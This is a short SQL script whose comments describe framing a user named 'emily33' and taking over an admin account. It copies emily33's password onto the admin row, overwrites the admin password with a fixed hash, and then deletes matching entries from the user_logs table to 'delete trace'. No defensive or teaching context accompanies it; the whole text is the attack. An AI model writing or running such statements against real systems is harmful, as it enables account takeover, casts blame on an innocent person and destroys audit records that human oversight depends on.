-- Frame 'emily33'
UPDATE users
SET password = (
    SELECT password
    FROM users
    WHERE username = 'emily33'
)
WHERE username = 'admin';

-- Change admin's password
UPDATE users
SET password = '982c0381c279d139fd221fce974916e7'
WHERE username = 'admin';

-- Deletes trace
DELETE FROM user_logs
WHERE new_password = '982c0381c279d139fd221fce974916e7';
